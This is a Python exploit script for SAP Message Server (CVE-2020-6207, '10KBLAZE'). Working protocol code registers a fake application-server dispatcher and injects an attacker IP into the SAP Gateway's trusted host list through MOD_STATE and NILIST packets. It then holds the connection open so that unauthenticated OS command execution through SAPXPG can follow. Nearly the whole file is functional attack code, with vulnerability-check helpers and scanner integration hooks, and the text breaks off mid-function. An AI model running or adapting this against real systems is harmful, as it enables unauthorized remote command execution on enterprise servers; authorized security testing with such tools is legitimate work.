#!/usr/bin/env python3
"""
sap_ms_betrusted.py – SAP Message Server betrusted exploit (10KBLAZE / CVE-2020-6207).

Registers a fake application server dispatcher with the SAP Message Server,
causing the MS to add the attacker IP to the SAP Gateway's trusted ("internal")
host list.  Once trusted, the gateway allows unauthenticated OS command execution
via the SAPXPG protocol — completing the 10KBLAZE exploit chain.

Attack chain:
  1. Connect to MS internal port (39NN, NN = instance number)
  2. LOGIN_2: register as a fake dispatcher from attacker IP
  3. MOD_STATE: complete registration, appear as an active ABAP application server
  4. ADM CHANGE_IP: explicitly update our IP in the MS routing table
  5. ADM NILIST:   proactively inject attacker IP into the gateway's trust list
  6. Wait for NILIST request from MS and reply (triggers immediate propagation)
  7. MS sends the updated trusted host list to the SAP Gateway
  8. Gateway adds attacker IP to its internal host list → SAPXPG works without auth

Supported kernel variants (DP info sizes/versions):
  - Kernel ~720: dp_version=11, SAPDPInfo2, 203 bytes (--dp-version 11)
  - Kernel ~742/745: dp_version=13, SAPDPInfo1, 507 bytes (default)
  - Kernel 749+: dp_version=14, SAPDPInfo3, 507 bytes (--dp-version 14)

Reference:
  - gelim/sap_ms (Python 2 original: https://github.com/gelim/sap_ms)
  - pysap SAPMS.py (field layouts and opcodes)
  - CVE-2020-6207: Missing authentication check in SAP Message Server
  - 10KBLAZE: Critical SAP vulnerabilities disclosed April 2019 (Onapsis)

For authorized security testing only.
"""

import argparse
import logging
import socket
import struct
import time
import sys

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# SAPMS protocol constants
# ---------------------------------------------------------------------------

_MS_EYE  = b"**MESSAGE**\x00"   # 12 bytes — every SAPMS packet starts here
_ADM_EYE = b"AD-EYECATCH\x00"   # 12 bytes — ADM body after SAPMS header

_HEADER_LEN   = 110  # SAPMS fixed header size (always)
_ADM_HDR_LEN  = 34   # ADM body prefix: 12 (eye) + 11 (recno) + 11 (recsize)
_ADM_REC_SIZE = 104  # SAPMSAdmRecord size: 3 (opcode+executed+errorno) + 101 (record)

# flag byte (header offset 66) — packet direction / type
FLAG_UNKNOWN = 0x00
FLAG_ONE_WAY = 0x01
FLAG_REQUEST = 0x02
FLAG_REPLY   = 0x03
FLAG_ADMIN   = 0x04

# iflag byte (header offset 67) — login / state sub-type
IFLAG_SEND_NAME = 0x01
IFLAG_LOGIN     = 0x03
IFLAG_LOGOUT    = 0x04
IFLAG_LOGIN_2   = 0x08   # extended login (sends diag_port)
IFLAG_MOD_STATE = 0x09   # modify registration state (START / ACTIVE)

# msgtype bitmask (header offset 54) — work-process types
MSG_DIA     = 0x01   # Dialogue
MSG_UPD     = 0x02   # Update
MSG_ENQ     = 0x04   # Enqueue
MSG_BTC     = 0x08   # Batch
MSG_SPO     = 0x10   # Spool
MSG_UP2     = 0x20   # Update2
MSG_ICM     = 0x80   # Internet Communication Manager
MSG_ALL     = 0xBB   # DIA|UPD|BTC|SPO|UP2|ICM  (no ENQ)
MSG_DIA_ENQ = 0x05   # DIA|ENQ — used for MOD_STATE START

# domain byte (header offset 56)
DOMAIN_ABAP = 0x00
DOMAIN_J2EE = 0x01

# ADM opcodes (SAPMSAdmRecord.opcode, 1 byte)
ADM_NOOP             = 0x00
ADM_DMP_ACT          = 0x01
ADM_DMP_DEACT        = 0x02
ADM_SERVER_LONG_LIST = 0x05
ADM_DUMP             = 0x06
ADM_NILIST           = 0x07   # inject IP into gateway trust list
ADM_CHANGE_IP        = 0x09   # update registered IP in MS routing table
ADM_GET_NILIST_PORT  = 0x28   # MS asks: "what port is your NILIST listener?"
                               # (pull model NILIST: MS connects to our port
                               # to fetch our IP list; reply with 0 = no listener)
ADM_FILE_RELOAD      = 0x1E   # reload config files (incl. ACL)

# Opcode in 4-byte opcode section (for non-admin REQUEST/REPLY packets)
OPCODE_NILIST = 0x07   # MS → AppServer: "send me your IP list"

# DP info versions / sizes
DP_VERSION_V11 = 11    # kernel ~720 (old)
DP_VERSION_V13 = 13    # kernel ~742/745 (most common)
DP_VERSION_V14 = 14    # kernel 749+ (newer)
DP_SIZE_V11    = 203   # SAPDPInfo2
DP_SIZE_V13    = 507   # SAPDPInfo1
DP_SIZE_V14    = 507   # SAPDPInfo3

# Registration defaults
DEFAULT_REG_NAME  = "msg_server"   # name to register as (appears as dispatcher)
DEFAULT_DIAG_PORT = 3200           # SAPGUI diag port we advertise


def ms_port(instance_nr: int) -> int:
    """Internal MS port for instance NN: 3900 + NN."""
    return 3900 + instance_nr


# ---------------------------------------------------------------------------
# NI (Network Interface) framing — identical to SAP Gateway protocol
# ---------------------------------------------------------------------------

def ni_send(sock: socket.socket, payload: bytes) -> None:
    """Send payload with a 4-byte big-endian NI length prefix."""
    sock.sendall(struct.pack("!I", len(payload)) + payload)


def ni_recv(sock: socket.socket, timeout: float = 10.0) -> bytes:
    """Receive one SAP NI frame (4-byte length + payload).

    Zero-length frames are NI PING keepalives and are silently skipped.
    """
    sock.settimeout(timeout)
    while True:
        hdr = b""
        while len(hdr) < 4:
            chunk = sock.recv(4 - len(hdr))
            if not chunk:
                raise ConnectionError("Connection closed reading NI header")
            hdr += chunk
        length = struct.unpack("!I", hdr)[0]
        if length == 0:
            continue  # NI PING keepalive — skip and wait for next frame
        if length > 0x400000:  # 4 MB sanity cap
            raise ValueError(f"NI frame too large: {length} bytes")
        data = b""
        while len(data) < length:
            chunk = sock.recv(min(length - len(data), 65536))
            if not chunk:
                raise ConnectionError("Connection closed reading NI payload")
            data += chunk
        return data


def ni_try_recv(sock: socket.socket, timeout: float = 5.0) -> bytes | None:
    """Try to receive one NI frame; return None on timeout or connection close."""
    try:
        return ni_recv(sock, timeout)
    except (socket.timeout, TimeoutError, ConnectionError, OSError):
        return None


# ---------------------------------------------------------------------------
# SAPMS header helpers
# ---------------------------------------------------------------------------

def _pad_name(name, length: int = 40) -> bytes:
    """Encode name as ASCII and right-pad with spaces to *length* bytes."""
    b = name.encode("ascii") if isinstance(name, str) else bytes(name)
    return (b + b" " * length)[:length]


def ms_build_header(toname: str, fromname: str, msgtype: int,
                    flag: int, iflag: int,
                    key: bytes = b"\x00" * 8,
                    diag_port: int = 0,
                    domain: int = DOMAIN_ABAP) -> bytes:
    """Build a 110-byte SAP MS packet header.

    Wire layout:
      [0:12]    eyecatcher  = b"**MESSAGE**\\x00"
      [12]      version     = 4
      [13]      errorno     = 0
      [14:54]   toname      (40 bytes, space-padded)
      [54]      msgtype     (bitmask: MSG_DIA | MSG_UPD | …)
      [55]      reserved    = 0
      [56]      domain      (0=ABAP, 1=J2EE)
      [57]      reserved    = 0
      [58:66]   key         (8-byte session key; all-zeros before login)
      [66]      flag        (FLAG_UNKNOWN/ONE_WAY/REQUEST/REPLY/ADMIN)
      [67]      iflag       (IFLAG_LOGIN_2/MOD_STATE/LOGOUT/…)
      [68:108]  fromname    (40 bytes, space-padded)
      [108:110] diag_port   (big-endian uint16; meaningful only for LOGIN_2)
    """
    assert len(key) == 8, f"session key must be 8 bytes (got {len(key)})"
    h  = _MS_EYE                          # [0:12]
    h += bytes([4, 0])                    # [12] version=4, [13] errorno=0
    h += _pad_name(toname)                # [14:54]
    h += bytes([msgtype, 0, domain, 0])   # [54:58]
    h += key                              # [58:66]
    h += bytes([flag, iflag])             # [66:68]
    h += _pad_name(fromname)              # [68:108]
    h += struct.pack("!H", diag_port)     # [108:110]
    assert len(h) == _HEADER_LEN
    return h


def ms_parse_header(data: bytes) -> dict:
    """Parse a 110-byte SAPMS header. Returns {} on failure."""
    if len(data) < _HEADER_LEN or data[:12] != _MS_EYE:
        return {}
    return {
        "version":   data[12],
        "errorno":   data[13],
        "toname":    data[14:54].rstrip(b" \x00").decode("ascii", errors="replace"),
        "msgtype":   data[54],
        "domain":    data[56],
        "key":       data[58:66],
        "flag":      data[66],
        "iflag":     data[67],
        "fromname":  data[68:108].rstrip(b" \x00").decode("ascii", errors="replace"),
        "diag_port": struct.unpack("!H", data[108:110])[0],
    }


def ms_parse_opcode(data: bytes) -> dict:
    """Parse the 4-byte opcode section that follows the 110-byte header."""
    if len(data) < _HEADER_LEN + 4:
        return {}
    opc = data[_HEADER_LEN:_HEADER_LEN + 4]
    return {"opcode": opc[0], "error": opc[1], "version": opc[2], "charset": opc[3]}


# ---------------------------------------------------------------------------
# Packet builders
# ---------------------------------------------------------------------------

def pkt_login_2(fromname: str, key: bytes = b"\x00" * 8,
                diag_port: int = DEFAULT_DIAG_PORT) -> bytes:
    """LOGIN_2: announce our dispatcher to the MS and request a session key."""
    return ms_build_header(
        toname="", fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_REQUEST, iflag=IFLAG_LOGIN_2,
        key=key, diag_port=diag_port,
    )


def pkt_logout(fromname: str, key: bytes) -> bytes:
    """LOGOUT: cleanly deregister from MS."""
    return ms_build_header(
        toname="", fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_ONE_WAY, iflag=IFLAG_LOGOUT,
        key=key,
    )


def pkt_mod_state(fromname: str, key: bytes,
                  msgtype: int, dp_info: bytes) -> bytes:
    """MOD_STATE: modify our registration state.

    Send twice:
      1. msgtype=MSG_DIA_ENQ  (0x05) → START
      2. msgtype=MSG_DIA      (0x01) → ACTIVE
    """
    hdr = ms_build_header(
        toname="", fromname=fromname,
        msgtype=msgtype, flag=FLAG_ONE_WAY, iflag=IFLAG_MOD_STATE,
        key=key,
    )
    return hdr + dp_info


def _adm_record(opcode: int, record_body: bytes, executed: int = 0) -> bytes:
    """Build one 104-byte SAPMSAdmRecord.

    Layout: [opcode 1B][executed 1B][errorno 1B][record 101B] = 104 bytes.
    record_body is truncated or zero-padded to exactly 101 bytes.
    """
    record_body = (record_body + b"\x00" * 101)[:101]
    return bytes([opcode, executed, 0]) + record_body


def pkt_adm(fromname: str, key: bytes, records: list) -> bytes:
    """Build an ADM (admin) packet with one or more SAPMSAdmRecord entries.

    Structure after the 110-byte MS header:
      [0:12]    ADM eyecatcher  = b"AD-EYECATCH\\x00"
      [12:23]   adm_recno       = "%11d" % len(records)   (right-justified, 11 bytes)
      [23:34]   adm_recsize     = "%11d" % 104             (right-justified, 11 bytes)
      [34+]     records         (104 bytes each)
    """
    hdr = ms_build_header(
        toname="", fromname=fromname,
        msgtype=MSG_DIA, flag=FLAG_ADMIN, iflag=0,
        key=key,
    )
    adm  = _ADM_EYE
    adm += ("%11d" % len(records)).encode("ascii")   # recno  (11B)
    adm += ("%11d" % _ADM_REC_SIZE).encode("ascii")  # recsize (11B)
    adm += b"".join(records)
    return hdr + adm


# ---------------------------------------------------------------------------
# ADM record payloads
# ---------------------------------------------------------------------------

def adm_change_ip_record(new_ip: str, old_ip: str = "0.0.0.0") -> bytes:
    """CHANGE_IP ADM record: tell MS our registered IP has changed.

    The MS updates its routing table; the new IP is included in the next
    NILIST it sends to the gateway, making the gateway trust new_ip.

    Record body layout (101 bytes):
      [0:4]    new_ip  (inet_aton)
      [4:8]    old_ip  (inet_aton, or 0.0.0.0 to replace any existing entry)
      [8:101]  zero padding
    """
    body = socket.inet_aton(new_ip) + socket.inet_aton(old_ip)
    return _adm_record(ADM_CHANGE_IP, body)


def adm_nilist_record(ip: str, kernel_new: bool = True) -> bytes:
    """NILIST ADM record: inject *ip* into the gateway's trusted host list.

    Two wire formats — choose based on target kernel:
      kernel_new=True  (kernel 745+): packed struct with count/mask/ip metadata
      kernel_new=False (kernel ~720): mask + ip + UTF-16-BE hostname field
    """
    if kernel_new:
        # Kernel 745+ new format
        rec  = struct.pack("!I", 1)              # count = 1 entry
        rec += struct.pack("!I", 0)              # padding
        rec += struct.pack("!I", 0)              # padding
        rec += socket.inet_aton("0.0.255.255")   # subnet mask (host-only match)
        rec += socket.inet_aton(ip)              # the IP to trust
        rec += struct.pack("!I", 0)              # padding
        rec += b"\x00\x00\x0c\xe5"               # type/flags (0x0CE5 = 3301)
        rec += b" \x00" * 35                    # hostname placeholder (70 bytes)
        rec += b" "                              # trailing space
        # rec is now 99 bytes; _adm_record pads record_body to 101
    else:
        # Kernel ~720 old format
        rec  = struct.pack("!II", 0, 0)          # 8 bytes padding
        rec += socket.inet_aton("0.0.255.255")   # subnet mask
        rec += socket.inet_aton(ip)              # the IP to trust
        rec += (41 * " ").encode("UTF-16-BE")    # hostname (82 bytes, UTF-16-BE)
        # rec is now 98 bytes; _adm_record pads to 101
    return _adm_record(ADM_NILIST, rec)


def adm_server_long_list_record() -> bytes:
    """SERVER_LONG_LIST ADM record: request list of registered servers from MS."""
    return _adm_record(ADM_SERVER_LONG_LIST, b"\x00" * 101)


# ---------------------------------------------------------------------------
# DP info blobs (body for MOD_STATE packets)
# ---------------------------------------------------------------------------

def build_dp_info(server_name: str, instance_nr: int = 0,
                  dp_version: int = DP_VERSION_V13,
                  attacker_ip: str = "") -> bytes:
    """Build a DP info blob to attach to MOD_STATE packets.

    The DP info describes our fake dispatcher (name, instance, version).
    The MS uses it to recognise us as an ABAP application server.

    dp_version=11 → 203 bytes  (SAPDPInfo2, kernel ~720)
    dp_version=13 → 507 bytes  (SAPDPInfo1, kernel 742/745)
    dp_version=14 → 507 bytes  (SAPDPInfo3, kernel 749+)

    Key fields (shared across all versions):
      [0]      dp_len_low   = size & 0xFF
      [1]      dp_version
      [6]      dp_type      = 1 (dispatcher)
      [11:13]  dp_instance  (2 bytes big-endian)
      [13:53]  dp_fromname  (40 bytes, space-padded)
      [61:65]  dp_worker_from_num (4 bytes big-endian)
      [65:69]  dp_respid_from     (4 bytes big-endian)
      [69:73]  dp_addr_from (IP as inet_aton, best-effort)
    """
    size = DP_SIZE_V11 if dp_version <= 11 else DP_SIZE_V13
    blob = bytearray(size)

    blob[0] = size & 0xFF          # dp_len low byte
    blob[1] = dp_version           # dp_version
    blob[6] = 0x01                 # dp_type = 1 (dispatcher)

    struct.pack_into("!H", blob, 11, instance_nr & 0xFFFF)  # dp_instance

    name_b = server_name.encode("ascii")[:40].ljust(40, b" ")
    blob[13:53] = name_b            # dp_fromname

    struct.pack_into("!I", blob, 61, 1)   # dp_worker_from_num
    struct.pack_into("!I", blob, 65, 1)   # dp_respid_from

    if attacker_ip:
        try:
            blob[69:73] = socket.inet_aton(attacker_ip)  # dp_addr_from
        except (socket.error, OverflowError):
            pass

    return bytes(blob)


# ---------------------------------------------------------------------------
# NILIST reply builder
# ---------------------------------------------------------------------------

def build_nilist_reply(fromname: str, key: bytes,
                       attacker_ip: str, kernel_new: bool = True) -> bytes:
    """Build a NILIST reply: ADM NILIST packet containing attacker IP."""
    rec = adm_nilist_record(attacker_ip, kernel_new=kernel_new)
    return pkt_adm(fromname, key, [rec])


def build_nilist_port_reply(fromname: str, key: bytes,
                             nilist_port: int = 0) -> bytes:
    """Reply to AD_GET_NILIST_PORT (opcode 0x28).

    The MS sends AD_GET_NILIST_PORT to ask the app server "what TCP port are
    you listening on for NILIST connections?" (pull-model NILIST).  If we do
    not reply, the MS work process that sent the request blocks indefinitely,
    which prevents the gateway from completing SAPXPG authorisation (P3).

    Replying with nilist_port=0 tells the MS we have no NILIST listener.
    The MS unblocks, logs the fact, and continues using the IP it already
    knows from our MOD_STATE DP blob.

    Record format: executed=1 (reply), body[0:2] = port (big-endian uint16).
    """
    body = bytearray(101)
    struct.pack_into("!H", body, 0, nilist_port & 0xFFFF)
    # opcode=ADM_GET_NILIST_PORT, executed=1 (reply), errorno=0
    rec = bytes([ADM_GET_NILIST_PORT, 1, 0]) + bytes(body)
    return pkt_adm(fromname, key, [rec])


# ---------------------------------------------------------------------------
# Wait-and-reply loop for incoming NILIST requests
# ---------------------------------------------------------------------------

def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                            attacker_ip: str, wait_secs: float,
                            kernel_new: bool = True) -> bool:
    """Block up to *wait_secs* seconds waiting for a NILIST request from MS.

    The MS sends NILIST requests to registered app servers periodically
    (typically every ~5 minutes) asking "what are your internal IPs?".
    We reply with attacker_ip, which the MS then forwards to the gateway.

    Handles two NILIST request variants:
      - ADM packet (flag=ADMIN) with ADM_NILIST opcode in the record
      - Regular REQUEST with opcode section OPCODE_NILIST

    Returns True if a NILIST request was received and replied to.
    """
    deadline = time.time() + wait_secs
    while time.time() < deadline:
        remaining = deadline - time.time()
        try:
            pkt = ni_recv(sock, min(remaining, 1.0))
        except (socket.timeout, TimeoutError):
            continue   # normal idle — keep waiting
        except (ConnectionError, OSError):
            logger.debug("NILIST wait: MS closed connection — exiting early")
            break      # socket dead, no point waiting further
        if len(pkt) < _HEADER_LEN:
            continue

        hdr = ms_parse_header(pkt)
        if not hdr:
            continue

        flag  = hdr.get("flag", -1)
        iflag = hdr.get("iflag", -1)

        # Log every received packet so we can see what the MS is sending
        opc = ms_parse_opcode(pkt)
        print(
            f"[*] Wait: MS pkt flag={flag:#04x} iflag={iflag:#04x} "
            f"msgtype={hdr.get('msgtype', 0):#04x} "
            f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)} "
            f"body={pkt[_HEADER_LEN:_HEADER_LEN+16].hex()}"
        )

        if flag == FLAG_ADMIN:
            adm = pkt[_HEADER_LEN:]

            # Standard ADM body: starts with AD-EYECATCH\x00 (12 bytes)
            if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
                first_opcode = adm[_ADM_HDR_LEN]   # record's opcode byte
            elif len(adm) >= 1:
                # Some kernels omit the ADM eyecatcher — opcode at byte 0
                first_opcode = adm[0]
                logger.debug(f"ADM without eyecatcher, treating byte[0]={first_opcode:#04x} as opcode")
            else:
                continue

            if first_opcode == ADM_NILIST:
                # Push-model NILIST: MS wants our IP list inline
                print(f"[*] ADM NILIST request received — replying with {attacker_ip}")
                reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                ni_send(sock, reply)
                return True

            if first_opcode == ADM_GET_NILIST_PORT:
                # Pull-model: MS asks "what port is your NILIST listener?"
                # Replying with port=0 immediately unblocks the MS work process.
                # Without this reply the MS DIA work process stays blocked (visible
                # in SM66 as 'ADM opcode AD_GET_NILIST_PORT (Server msg_server)'),
                # which prevents the GW from completing SAPXPG authorisation (P3).
                print(f"[*] AD_GET_NILIST_PORT received — replying port=0 "
                      f"(unblocking MS work process)")
                reply = build_nilist_port_reply(fromname, key, nilist_port=0)
                ni_send(sock, reply)
                # Don't return — keep waiting; MS may follow with NILIST request

        elif flag in (FLAG_REQUEST, FLAG_ONE_WAY) and iflag == 0:
            if opc.get("opcode") == OPCODE_NILIST:
                print(f"[*] OPCODE NILIST request received — replying with {attacker_ip}")
                reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                ni_send(sock, reply)
                return True
            # Also handle AD_GET_NILIST_PORT sent as a REQUEST (some kernel variants)
            if opc.get("opcode") == ADM_GET_NILIST_PORT:
                print(f"[*] AD_GET_NILIST_PORT (as REQUEST) — replying port=0")
                reply = build_nilist_port_reply(fromname, key, nilist_port=0)
                ni_send(sock, reply)

    return False


# ---------------------------------------------------------------------------
# High-level public API
# ---------------------------------------------------------------------------

def check_ms_accessible(host: str, port: int, timeout: float = 5.0) -> dict:
    """Check if the MS internal port (39NN) is reachable from the network.

    Returns:
        accessible: bool — TCP connection succeeded
        error:      str  — error if not accessible
    """
    result = {"accessible": False, "error": ""}
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        result["accessible"] = True
    except Exception as e:
        result["error"] = str(e)
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return result


def check_ms_acl(host: str, port: int, timeout: float = 10.0) -> dict:
    """Check if the MS internal port lacks ACL protection (CVE-2020-6207).

    Attempts to complete the LOGIN_2 handshake.  If the MS replies with a
    session key, it is unauthenticated and vulnerable to the betrusted attack.

    Returns:
        vulnerable:    bool — True if MS lacks ACL protection
        acl_protected: bool — True if MS is accessible but ACL blocks our IP
        session_key:   str  — hex session key from MS login reply
        ms_name:       str  — MS server name from login reply
        errorno:       int  — raw MS error number from login reply (0 = success)
        error:         str  — error message if check failed
    """
    result = {
        "vulnerable": False,
        "acl_protected": False,
        "session_key": "",
        "ms_name": "",
        "errorno": 0,
        "error": "",
    }
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))

        ni_send(sock, pkt_login_2("sapmap_probe"))
        resp = ni_recv(sock, timeout)
        hdr  = ms_parse_header(resp)

        if not hdr:
            result["error"] = "No valid SAPMS header in response"
            return result

        errorno = hdr.get("errorno", 1)
        result["errorno"] = errorno

        if errorno != 0:
            result["acl_protected"] = True
            result["ms_name"] = hdr.get("fromname", "")
            result["error"] = (
                f"MS rejected login (errorno={errorno}) — "
                f"ACL is configured, betrusted not possible from this IP"
            )
            return result

        key = hdr.get("key", b"\x00" * 8)
        result["vulnerable"]  = True
        result["session_key"] = key.hex()
        result["ms_name"]     = hdr.get("fromname", "")

        # Clean logout
        try:
            ni_send(sock, pkt_logout("sapmap_probe", key))
        except Exception:
            pass

    except Exception as e:
        result["error"] = str(e)
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return result


def betrusted(host: str, port: int, attacker_ip: str,
              instance_nr: int = 0,
              our_name: str = DEFAULT_REG_NAME,
              diag_port: int = DEFAULT_DIAG_PORT,
              timeout: float = 10.0,
              nilist_wait: float = 60.0,
              dp_version: int = DP_VERSION_V13,
              kernel_new: bool = True,
              verbose: bool = False,
              stop_event=None) -> dict:
    """Execute the betrusted attack against an SAP Message Server.

    Registers a fake ABAP dispatcher with the MS, which then propagates
    attacker_ip to the SAP Gateway's trusted host list, enabling SAPXPG
    unauthenticated command execution from that IP.

    Args:
        host:         MS host (IP or hostname)
        port:         MS internal port (typically 3900 + instance_nr)
        attacker_ip:  IP to inject into the gateway's trusted host list
        instance_nr:  SAP instance number (0–99)
        our_name:     Server name to register as (default "msg_server")
        diag_port:    SAPGUI diag port to advertise (default 3200)
        timeout:      Socket timeout in seconds
        nilist_wait:  Max seconds to wait for NILIST request from MS (0=skip)
        dp_version:   DP info version (11=kernel~720, 13=kernel~745, 14=kernel749+)
        kernel_new:   Use new NILIST record format (True for kernel 745+)
        verbose:      Print debug output to stderr
        stop_event:   threading.Event — when set, exit the hold-alive loop and
                      disconnect.  When provided the function keeps the MS TCP
                      connection open after the NILIST-wait phase so the gateway
                      trust stays active while the caller runs the exploit.
                      The caller MUST eventually set the event to avoid a hang.

    Returns dict:
        success:         bool — attack likely succeeded
        error:           str  — error message on failure
        session_key:     str  — MS session key received (hex)
        change_ip_sent:  bool — ADM CHANGE_IP was sent
        nilist_sent:     bool — ADM NILIST record was sent (inbound reply)
        nilist_response: bool — MS sent NILIST request and we replied
    """
    if verbose:
        logging.basicConfig(level=logging.DEBUG,
                            format="[DBG] %(message)s", stream=sys.stderr)

    result = {
        "success": False,
        "error": "",
        "session_key": "",
        "change_ip_sent": False,
        "nilist_sent": False,
        "nilist_response": False,
    }

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    try:
        # ---- Connect -------------------------------------------------------
        print(f"[*] Connecting to MS at {host}:{port}")
        sock.connect((host, port))

        # ---- LOGIN_2 -------------------------------------------------------
        print(f"[*] Sending LOGIN_2 as {our_name!r} (diag_port={diag_port})")
        ni_send(sock, pkt_login_2(our_name, diag_port=diag_port))

        resp = ni_recv(sock, timeout)
        hdr  = ms_parse_header(resp)

        if not hdr:
            result["error"] = "No valid SAPMS header in login response"
            return result

        if hdr.get("errorno", 0) != 0:
            result["error"] = (
                f"MS rejected login (errorno={hdr['errorno']}). "
                f"MS may be protected by ACL."
            )
            return result

        key     = hdr.get("key", b"\x00" * 8)
        ms_name = hdr.get("fromname", "")
        result["session_key"] = key.hex()
        print(f"[+] Logged in — MS server: {ms_name!r}  key: {key.hex()}")

        # ---- MOD_STATE: START then ACTIVE ----------------------------------
        dp_info = build_dp_info(our_name, instance_nr, dp_version, attacker_ip)
        print(f"[*] MOD_STATE START  (dp_version={dp_version}, {len(dp_info)}B DP blob)")
        ni_send(sock, pkt_mod_state(our_name, key, MSG_DIA_ENQ, dp_info))
        time.sleep(0.2)
        print(f"[*] MOD_STATE ACTIVE")
        ni_send(sock, pkt_mod_state(our_name, key, MSG_DIA, dp_info))
        time.sleep(0.3)

        # ---- Registration complete ----------------------------------------
        # The attacker IP is already embedded in the MOD_STATE DP blob
        # (dp_addr_from, offset 69-73).  The MS reads it from there and
        # adds it to the internal server table that gets propagated to the
        # gateway on the next MS→GW NILIST cycle.
        #
        # NOTE: sending ANY ADM packet (CHANGE_IP, NILIST, …) from the
        # fake app server *to* the MS is rejected by the MS — these ADMs
        # flow MS→AppServer, not the other way around.  Sending them causes
        # an immediate LOGOUT/disconnect, killing the trust before it
        # propagates.  We therefore send NO ADM packets at all.
        print(f"[*] Registration complete — {attacker_ip} is in the MS server "
              f"table via MOD_STATE DP blob (dp_addr_from)")

        result["change_ip_sent"] = True   # conceptually: IP is in DP blob
        result["success"] = True

        # ---- Wait for MS NILIST request (accelerates trust propagation) ----
        # The MS periodically asks registered app servers for their IP list
        # (NILIST request).  Replying immediately makes the MS push our IP
        # to the gateway right away rather than waiting for its next cycle.
        # We wait here while holding the connection open.
        if nilist_wait > 0:
            print(f"[*] Waiting up to {nilist_wait:.0f}s for NILIST request from MS "
                  f"(connection held open)...")
            got = _wait_and_reply_nilist(
                sock, our_name, key, attacker_ip, nilist_wait,
                kernel_new=kernel_new,
            )
            if got:
                result["nilist_response"] = True
                result["nilist_sent"] = True
                print(f"[+] Replied to NILIST request — "
                      f"{attacker_ip} propagated to gateway immediately")
            else:
                print(f"[!] No NILIST request in {nilist_wait:.0f}s — "
                      f"MS will propagate our IP on its next cycle "
                      f"(typically every 30-60 s while connected)")

        print()
        print(f"[+] betrusted registration active.")
        print(f"[*] {attacker_ip} in MS server table; "
              f"gateway trust active while TCP connection is held open.")

        # ---- Hold connection alive until caller signals to stop ------------
        # The gateway only trusts attacker_ip while our fake app server is
        # registered in the MS server table — i.e. while the TCP connection
        # is alive.  Disconnecting (or sending LOGOUT) causes the MS to
        # deregister us and remove our IP from the gateway's trust list.
        #
        # When stop_event is provided we hold the connection open so the
        # caller can run the gateway exploit while we are still registered.
        if stop_event is not None:
            print(f"[*] Holding MS connection open (waiting for exploit to complete)...")
            while not stop_event.is_set():
                # Keep reading with a short timeout so we can check stop_event
                # between reads and reply to any NILIST requests that arrive.
                try:
                    pkt = ni_recv(sock, timeout=0.5)
                except (socket.timeout, TimeoutError):
                    continue   # idle — keep holding
                except (ConnectionError, OSError):
                    logger.debug("Hold phase: MS closed connection")
                    break
                if len(pkt) >= _HEADER_LEN:
                    hdr2 = ms_parse_header(pkt)
                    if not hdr2:
                        continue
                    flag2  = hdr2.get("flag", -1)
                    iflag2 = hdr2.get("iflag", -1)
                    print(f"[*] Hold: MS pkt flag={flag2:#04x} iflag={iflag2:#04x} "
                          f"len={len(pkt)} body={pkt[_HEADER_LEN:_HEADER_LEN+16].hex()}")
                    try:
                        if flag2 == FLAG_ADMIN:
                            adm = pkt[_HEADER_LEN:]
                            # Determine opcode: with or without ADM eyecatcher
                            if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
                                opcode = adm[_ADM_HDR_LEN]
                            elif len(adm) >= 1:
                                opcode = adm[0]
                            else:
                                continue
                            if opcode == ADM_NILIST:
                                print("[*] Hold: ADM NILIST request — replying")
                                ni_send(sock, build_nilist_reply(
                                    our_name, key, attacker_ip, kernel_new))
                                result["nilist_response"] = True
                                result["nilist_sent"] = True
                            elif opcode == ADM_GET_NILIST_PORT:
                                print("[*] Hold: AD_GET_NILIST_PORT — replying port=0")
                                ni_send(sock, build_nilist_port_reply(
                                    our_name, key, nilist_port=0))
                            else:
                                print(f"[*] Hold: ADM opcode {opcode:#04x} (ignored)")
                        elif flag2 in (FLAG_REQUEST, FLAG_ONE_WAY):
                            opc2 = ms_parse_opcode(pkt)
                            opc_val = opc2.get("opcode", -1)
                            if opc_val == OPCODE_NILIST:
                                print("[*] Hold: OPCODE NILIST (REQUEST) — replying")
                                ni_send(sock, build_nilist_reply(
                                    our_name, key, attacker_ip, kernel_new))
                                result["nilist_response"] = True
                                result["nilist_sent"] = True
                            elif opc_val == ADM_GET_NILIST_PORT:
                                print("[*] Hold: AD_GET_NILIST_PORT (REQUEST) — replying port=0")
                                ni_send(sock, build_nilist_port_reply(
                                    our_name, key, nilist_port=0))
                    except (ConnectionError, OSError):
                        break
            print(f"[*] Stop signal received — disconnecting from MS")
        else:
            # Standalone / CLI mode: keep connection open for nilist_wait
            # more seconds so the caller has time to test manually.
            time.sleep(0.5)

        # Drop the connection without sending LOGOUT — sending LOGOUT would
        # immediately deregister us and undo the trust injection.

    except ConnectionRefusedError:
        result["error"] = (
            f"Port {port} refused — MS internal port not exposed externally. "
            f"Try --instance 0..9 or check firewall rules for port 39NN."
        )
        print(f"[-] {result['error']}")
    except Exception as e:
        result["error"] = str(e)
        print(f"[-] Error: {e}")
        logger.debug("Exception details:", exc_info=True)
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return result


# ---------------------------------------------------------------------------
# SAPMAP integration hooks
# ---------------------------------------------------------------------------

def sapmap_check_ms(host: str, instance_nr: int, timeout: float = 5.0) -> dict:
    """SAPMAP integration: check MS internal port for CVE-2020-6207 (betrusted).

    Runs check_ms_accessible + check_ms_acl for a given instance.
    Returns a combined result dict suitable for node enrichment.

    Returns:
        port:        int  — MS internal port checked (39NN)
        accessible:  bool — port is reachable
        vulnerable:  bool — MS lacks ACL (login succeeded)
        session_key: str  — hex session key if logged in
        ms_name:     str  — MS server name if logged in
        error:       str  — error message
    """
    port = ms_port(instance_nr)
    result = {
        "port":          port,
        "accessible":    False,
        "vulnerable":    False,
        "acl_protected": False,
